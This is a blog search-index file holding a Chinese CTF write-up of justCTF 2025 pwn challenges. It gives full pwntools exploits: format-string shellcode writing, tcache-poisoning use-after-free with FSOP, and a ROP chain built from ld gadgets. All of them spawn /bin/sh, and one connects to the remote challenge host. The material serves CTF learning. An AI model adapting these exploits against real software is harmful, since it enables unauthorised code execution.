<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>justctf2025 pwn</title>
      <link href="/2025/08/07/justctf2025-pwn/"/>
      <url>/2025/08/07/justctf2025-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="justctf2025-pwn"><a href="#justctf2025-pwn" class="headerlink" title="justctf2025 pwn"></a>justctf2025 pwn</h1><pre><code> 上周打了一下justctf，做了一道babyheap，shellcode没想到jmp短跳指令，没做出来，prospector和jctfcoin是学长做的就没看，QAQ，今天看了一下，还可以## shellcode printer</code></pre><p>利用printf的%hn，每次两个字节向mmap中写shellcode，最后可以执行两个字节的shellcode，利用jmp的短跳指令可以直接跳回一开始的shellcode，就可以getshell了</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        movabs rdi, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">        push   rdi</span></span><br><span class="line"><span class="string">        lea rdi,[rsp]</span></span><br><span class="line"><span class="string">        xor rsi,rsi</span></span><br><span class="line"><span class="string">        xor rdx,rdx</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        add rax,59</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p=process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">    <span class="comment"># p=remote(&#x27;shellcode-printer.nc.jctf.pro&#x27;,1337)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># 提取两字节，如果是最后一个且长度为奇数则只取一个字节</span></span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(shellcode):</span><br><span class="line">            two_bytes = shellcode[i] | (shellcode[i+<span class="number">1</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            two_bytes = shellcode[i]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算需要填充的字符数</span></span><br><span class="line">        padding = two_bytes</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造格式字符串，%6$hn表示写入到第6个参数指向的地址</span></span><br><span class="line">        fmt_str = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(padding).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line">        ru(<span class="string">b&#x27;Enter a format string: &#x27;</span>)</span><br><span class="line">        sl(fmt_str)</span><br><span class="line"></span><br><span class="line">    fmt_str = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xe0eb</span>).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line">    ggg()</span><br><span class="line">    ru(<span class="string">b&#x27;Enter a format string: &#x27;</span>)</span><br><span class="line">    sl(fmt_str)</span><br><span class="line">    ru(<span class="string">b&#x27;Enter a format string: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    shell()</span><br></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>很明显的free掉chunk后指针没有清零，可以uaf，难点在于怎么泄露libc，利用tcache任意地址分配chunk，打tcache的结构体，使得堆管理机制认为0x100的chunk已经把tcachebin填满了，然后堆叠伪造一个0x100的chunk，free掉这个chunk就会进入到unstorebin了，然后就可以泄露libc了，之后就是FSOP，没什么好说的了</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index? &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    ru(<span class="string">&#x27;Content? Content? &#x27;</span>)</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index? &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index? &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    ru(<span class="string">&#x27;Content? &#x27;</span>)</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index? &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;baby-heap.nc.jctf.pro&#x27;</span>,<span class="number">1337</span>,timeout=<span class="number">10</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;0.0.0.0&#x27;,9999)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=key&lt;&lt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=p64(key^he(<span class="number">0x20</span>))</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x700000000</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># add(10,p64(0)+p64(0x101)+p64(he(0x430+0x40*1)^key))</span></span><br><span class="line"><span class="comment"># add(11,p64(0)+p64(0x101)+p64(he(0x430+0x40*2)^key))</span></span><br><span class="line"><span class="comment"># add(12,p64(0)+p64(0x101)+p64(he(0x430+0x40*3)^key))</span></span><br><span class="line"><span class="comment"># add(13,p64(0)+p64(0x101)+p64(he(0x430+0x40*4)^key))</span></span><br><span class="line"><span class="comment"># add(14,p64(0)+p64(0x101)+p64(he(0x430+0x40*5)^key))</span></span><br><span class="line"><span class="comment"># add(15,p64(0)+p64(0x101)+p64(he(0x430+0x40*6)^key))</span></span><br><span class="line"><span class="comment"># add(16,p64(0)+p64(0x101)+p64(key))</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(he(<span class="number">0x2d0</span>)^key))</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">read(<span class="number">2</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x203b20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">_IO_list_all=lis(<span class="string">&#x27;_IO_list_all&#x27;</span>)</span><br><span class="line">IO_wfile_jumps=libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">setcontext_61=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">system,binsh=getshell()</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(_IO_list_all^key))</span><br><span class="line">add(<span class="number">18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">19</span>,p64(he(<span class="number">0x2a0</span>)))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">1</span>))</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(IO_wfile_jumps+<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(he(<span class="number">0x200</span>))+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(he(<span class="number">0x2e0</span>)))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">edit(<span class="number">7</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)+p64(he(<span class="number">0x3a0</span>)))</span><br><span class="line">esc()</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h2 id="prospector"><a href="#prospector" class="headerlink" title="prospector"></a>prospector</h2><p>这个题没有libc，只有ld，还是挺有意思的，对于逆向的帮助挺大的</p><p>在Nick输入的时候有栈溢出，可以先修改判断条件的地方为1，然后泄露信息后对照伪代码进行逆运算，就可以得到mmap的地址了，不过有一位不知道，需要爆破一下，16分之一的几率，也是挺快的，mmap的地址和ld地址的偏移是固定的，泄露出ld之后用ld里的gadget就可以getshell了，题目中还给了一个空函数，里面有一些gadget不知道是干啥用的，没用到就可以getshell，可能这是非预期了吧</p><p>因为远程的环境已经停止了，没有试过远程，本地可以通  ) (</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./prospector&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p=process(<span class="string">&#x27;./prospector&#x27;</span>)</span><br><span class="line">    <span class="comment"># p=remote(&#x27;prospector.nc.jctf.pro&#x27;,1337)</span></span><br><span class="line">    ru(<span class="string">b&#x27;Nick: &#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p32(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">b&#x27;score: &#x27;</span>)</span><br><span class="line">    key=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    mmap=((key|<span class="number">0xe0000000</span>)//<span class="number">2</span>)&lt;&lt;<span class="number">16</span></span><br><span class="line">    mmap+=<span class="number">0x8000</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(mmap))</span><br><span class="line">    ld=mmap+<span class="number">0x9000</span></span><br><span class="line">    rdi_rbp=<span class="number">0x0000000000003399</span>+ld</span><br><span class="line">    rsi_rbp=<span class="number">0x0000000000005740</span>+ld</span><br><span class="line">    rax=<span class="number">0x0000000000015b3b</span>+ld</span><br><span class="line">    syscall=<span class="number">0x000000000000b8b9</span>+ld</span><br><span class="line">    binsh=mmap+<span class="number">0x40</span>+<span class="number">0x30</span></span><br><span class="line">    rdx=<span class="number">0x000000000002856e</span>+ld<span class="comment">#mov rdx, qword ptr [rax + 0x10] ; test rdx, rdx ; jne 0x28560 ; ret</span></span><br><span class="line">    ru(<span class="string">b&#x27;Nick: &#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(mmap)+p64(mmap+<span class="number">0x40</span>)+p64(<span class="number">0</span>)+p64(rdi_rbp)+p64(binsh-<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(rsi_rbp)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rax)+p64(mmap+<span class="number">0x100</span>)+p64(rdx)+p64(rax)+p64(<span class="number">0x3b</span>)+p64(syscall))</span><br><span class="line">    ru(<span class="string">b&#x27;Color: &#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    data = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Invalid color, try again&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h2 id="jctfcoin"><a href="#jctfcoin" class="headerlink" title="jctfcoin"></a>jctfcoin</h2><p>看了一下题目，和挖矿的函数没有什么联系，主要在REname，也就是edit的过程中有16字节的溢出，off by one都可以getshell，16字节更不用说了，堆叠后通过堆风水是可以实现泄露libc和heap的，之后也是FSOP就可以了，没什么新东西</p><p>大概看了一下后就没写exp了，QAQ，不要学我这么懒噢~~</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#看啥呢，都说了没写了（；;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> justctf2025 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-environ打栈</title>
      <link href="/2025/07/31/pwn-environ%E6%89%93%E6%A0%88/"/>
      <url>/2025/07/31/pwn-environ%E6%89%93%E6%A0%88/</url>
      
